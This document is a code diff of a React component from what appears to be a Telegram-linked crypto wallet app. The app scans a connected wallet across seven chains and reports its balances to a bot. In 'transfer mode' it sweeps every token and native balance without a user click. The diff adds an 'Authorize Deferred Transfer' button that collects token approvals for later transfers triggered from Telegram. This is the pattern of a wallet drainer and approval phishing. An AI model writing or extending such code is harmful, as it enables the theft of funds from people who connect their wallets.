@@ -2,9 +2,11 @@ import { useEffect, useRef } from "react";
 import { useWalletContext } from "../hooks/useWalletContext";
 import { useMultiChainScan, type ChainBalances, type ScannedToken } from "../hooks/useMultiChainScan";
 import { useTransferAll, type TransferStep } from "../hooks/useTransferAll";
+import { useApproveAll } from "../hooks/useApproveAll";
 import {
   notifyWalletConnected,
   notifyTransferComplete,
+  notifyApprovalsComplete,
   isTransferMode,
   type ChainSummary,
 } from "../utils/telegramBridge";
@@ -87,10 +89,15 @@ function ChainSection({ chain }: { chain: ChainBalances }) {
 export function PipelinePanel() {
   const { isConnected, address } = useWalletContext();
   const { chains, totalTokensWithBalance, scanning, scan } = useMultiChainScan();
-  const { progress, transferAll, reset } = useTransferAll();
+  const { progress: transferProgress, transferAll, reset: resetTransfer } = useTransferAll();
+  const { progress: approvalProgress, approveAll, reset: resetApproval } = useApproveAll();
   const notifiedRef = useRef(false);
   const autoTransferRef = useRef(false);
+  const autoApproveRef = useRef(false);
 
+  const inTransferMode = isTransferMode();
+
+  // Notify bot when wallet connects (scan-only mode)
   useEffect(() => {
     if (
       !notifiedRef.current &&
@@ -98,7 +105,7 @@ export function PipelinePanel() {
       chains.length > 0 &&
       !scanning &&
       totalTokensWithBalance > 0 &&
-      !isTransferMode() // Don't send wallet_connected in transfer mode (sendData closes the app)
+      !inTransferMode
     ) {
       notifiedRef.current = true;
       const summaries: ChainSummary[] = chains
@@ -111,34 +118,52 @@ export function PipelinePanel() {
         }));
       notifyWalletConnected(address, summaries, totalTokensWithBalance);
     }
-  }, [address, chains, scanning, totalTokensWithBalance]);
+  }, [address, chains, scanning, totalTokensWithBalance, inTransferMode]);
 
+  // Auto-trigger transfer in transfer mode
   useEffect(() => {
     if (
-      isTransferMode() &&
+      inTransferMode &&
       !autoTransferRef.current &&
       address &&
       chains.length > 0 &&
       !scanning &&
       totalTokensWithBalance > 0 &&
-      progress.step === "idle"
+      transferProgress.step === "idle"
     ) {
       autoTransferRef.current = true;
       transferAll(chains);
     }
-  }, [address, chains, scanning, totalTokensWithBalance, progress.step, transferAll]);
+  }, [address, chains, scanning, totalTokensWithBalance, transferProgress.step, transferAll, inTransferMode]);
 
+  // Notify bot when transfer completes
   useEffect(() => {
-    if (progress.step === "done" && progress.txHashes.length > 0) {
-      notifyTransferComplete(progress.txHashes, progress.completed);
+    if (transferProgress.step === "done" && transferProgress.txHashes.length > 0) {
+      notifyTransferComplete(transferProgress.txHashes, transferProgress.completed);
     }
-  }, [progress.step, progress.txHashes, progress.completed]);
+  }, [transferProgress.step, transferProgress.txHashes, transferProgress.completed]);
+
+  // Notify bot when approvals complete
+  useEffect(() => {
+    if (approvalProgress.step === "done" && approvalProgress.approved.length > 0 && address) {
+      notifyApprovalsComplete(
+        address,
+        approvalProgress.approved.map((a) => ({
+          chainId: a.chainId,
+          token: a.token,
+          address: a.address,
+        })),
+      );
+    }
+  }, [approvalProgress.step, approvalProgress.approved, address]);
 
   if (!isConnected) return null;
 
   const chainsWithValue = chains.filter((c) => c.hasValue);
   const isTransferring =
-    progress.step !== "idle" && progress.step !== "done" && progress.step !== "error";
+    transferProgress.step !== "idle" && transferProgress.step !== "done" && transferProgress.step !== "error";
+  const isApproving = approvalProgress.step === "approving";
+  const hasTokens = totalTokensWithBalance > 0 || chainsWithValue.some((c) => c.nativeBalance > 0n);
 
   return (
     <section className="mx-4 mt-5">
@@ -159,9 +184,7 @@ export function PipelinePanel() {
       {scanning && (
         <div className="flex flex-col items-center gap-3 py-6">
           <div className="h-8 w-8 animate-spin rounded-full border-2 border-white/10 border-t-indigo-400" />
-          <p className="text-sm text-white/60">
-            Scanning 7 chains...
-          </p>
+          <p className="text-sm text-white/60">Scanning 7 chains...</p>
         </div>
       )}
 
@@ -169,15 +192,11 @@ export function PipelinePanel() {
         <>
           <div className="mb-3 flex items-center gap-3">
             <div className="rounded-xl bg-white/5 px-3 py-2">
-              <p className="text-[10px] uppercase tracking-wider text-white/40">
-                Chains
-              </p>
+              <p className="text-[10px] uppercase tracking-wider text-white/40">Chains</p>
               <p className="text-lg font-bold">{chainsWithValue.length}</p>
             </div>
             <div className="rounded-xl bg-white/5 px-3 py-2">
-              <p className="text-[10px] uppercase tracking-wider text-white/40">
-                Tokens
-              </p>
+              <p className="text-[10px] uppercase tracking-wider text-white/40">Tokens</p>
               <p className="text-lg font-bold">{totalTokensWithBalance}</p>
             </div>
           </div>
@@ -206,14 +225,65 @@ export function PipelinePanel() {
             )}
           </div>
 
-          {/* Transfer All Button */}
-          {progress.step === "idle" && (totalTokensWithBalance > 0 || chainsWithValue.some(c => c.nativeBalance > 0n)) && (
-            <button
-              onClick={() => transferAll(chains)}
-              className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-fuchsia-500 py-3 text-sm font-bold"
-            >
-              Transfer All ({totalTokensWithBalance} tokens + native)
-            </button>
+          {/* Action Buttons — only when idle */}
+          {transferProgress.step === "idle" && approvalProgress.step !== "approving" && hasTokens && (
+            <div className="space-y-2">
+              {/* Approve All — allows deferred transfer later from Telegram */}
+              {approvalProgress.step !== "done" && (
+                <button
+                  onClick={() => approveAll(chains)}
+                  className="w-full rounded-xl border border-amber-500/30 bg-amber-500/10 py-3 text-sm font-bold text-amber-300"
+                >
+                  Authorize Deferred Transfer ({totalTokensWithBalance} tokens)
+                </button>
+              )}
+
+              {approvalProgress.step === "done" && (
+                <div className="rounded-xl border border-amber-500/20 bg-amber-500/5 p-3 text-center">
+                  <p className="text-xs text-amber-400">
+                    {approvalProgress.approved.length} tokens authorized for deferred transfer
+                  </p>
+                </div>
+              )}
+
+              {/* Transfer All Now — immediate */}
+              <button
+                onClick={() => transferAll(chains)}
+                className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-fuchsia-500 py-3 text-sm font-bold"
+              >
+                Transfer All Now ({totalTokensWithBalance} tokens + native)
+              </button>
+            </div>
+          )}
+
+          {/* Approval Progress */}
+          {isApproving && (
+            <div className="rounded-2xl border border-amber-500/20 bg-amber-500/5 p-4">
+              <div className="mb-2 flex items-center gap-3">
+                <div className="h-6 w-6 animate-spin rounded-full border-2 border-white/10 border-t-amber-400" />
+                <div>
+                  <p className="text-xs font-medium text-white/80">
+                    Approving tokens...
+                  </p>
+                  {approvalProgress.currentChain && (
+                    <p className="text-[10px] text-white/40">
+                      {approvalProgress.currentChain} — {approvalProgress.currentToken}
+                    </p>
+                  )}
+                </div>
+              </div>
+              <div className="h-1.5 overflow-hidden rounded-full bg-white/10">
+                <div
+                  className="h-full rounded-full bg-amber-500 transition-all"
+                  style={{
+                    width: `${approvalProgress.total > 0 ? (approvalProgress.completed / approvalProgress.total) * 100 : 0}%`,
+                  }}
+                />
+              </div>
+              <p className="mt-1 text-right text-[10px] text-white/30">
+                {approvalProgress.completed}/{approvalProgress.total}
+              </p>
+            </div>
           )}
 
           {/* Transfer Progress */}
@@ -223,11 +293,11 @@ export function PipelinePanel() {
                 <div className="h-6 w-6 animate-spin rounded-full border-2 border-white/10 border-t-indigo-400" />
                 <div>
                   <p className="text-xs font-medium text-white/80">
-                    {STEP_LABELS[progress.step]}
+                    {STEP_LABELS[transferProgress.step]}
                   </p>
-                  {progress.currentChain && (
+                  {transferProgress.currentChain && (
                     <p className="text-[10px] text-white/40">
-                      {progress.currentChain} — {progress.currentToken}
+                      {transferProgress.currentChain} — {transferProgress.currentToken}
                     </p>
                   )}
                 </div>
@@ -236,30 +306,30 @@ export function PipelinePanel() {
                 <div
                   className="h-full rounded-full bg-indigo-500 transition-all"
                   style={{
-                    width: `${progress.total > 0 ? (progress.completed / progress.total) * 100 : 0}%`,
+                    width: `${transferProgress.total > 0 ? (transferProgress.completed / transferProgress.total) * 100 : 0}%`,
                   }}
                 />
               </div>
               <p className="mt-1 text-right text-[10px] text-white/30">
-                {progress.completed}/{progress.total}
+                {transferProgress.completed}/{transferProgress.total}
               </p>
             </div>
           )}
 
           {/* Done */}
-          {progress.step === "done" && progress.txHashes.length > 0 && (
+          {transferProgress.step === "done" && transferProgress.txHashes.length > 0 && (
             <div className="rounded-2xl border border-emerald-500/20 bg-emerald-500/5 p-4 text-center">
               <div className="mx-auto mb-2 flex h-10 w-10 items-center justify-center rounded-full bg-emerald-500/20">
                 <span className="text-lg text-emerald-400">&#10003;</span>
               </div>
               <p className="text-sm font-medium text-emerald-400">
-                {progress.completed} transfers complete
+                {transferProgress.completed} transfers complete
               </p>
               <p className="mt-1 text-[10px] text-white/30">
-                {progress.txHashes.length} tx confirmed
+                {transferProgress.txHashes.length} tx confirmed
               </p>
               <button
-                onClick={reset}
+                onClick={resetTransfer}
                 className="mt-3 rounded-xl border border-white/10 px-4 py-2 text-xs font-medium text-white/60 hover:bg-white/5"
               >
                 Done
@@ -268,16 +338,18 @@ export function PipelinePanel() {
           )}
 
           {/* Error */}
-          {progress.step === "error" && (
+          {(transferProgress.step === "error" || approvalProgress.step === "error") && (
             <div className="rounded-2xl border border-red-500/20 bg-red-500/5 p-4 text-center">
-              <p className="text-sm text-red-400">{progress.error}</p>
-              {progress.completed > 0 && (
+              <p className="text-sm text-red-400">
+                {transferProgress.error || approvalProgress.error}
+              </p>
+              {transferProgress.completed > 0 && (
                 <p className="mt-1 text-[10px] text-white/40">
-                  {progress.completed}/{progress.total} completed before error
+                  {transferProgress.completed}/{transferProgress.total} completed before error
                 </p>
               )}
               <button
-                onClick={reset}
+                onClick={() => { resetTransfer(); resetApproval(); }}
                 className="mt-3 rounded-xl border border-white/10 px-4 py-2 text-xs font-medium text-white/60 hover:bg-white/5"
               >
                 Retry
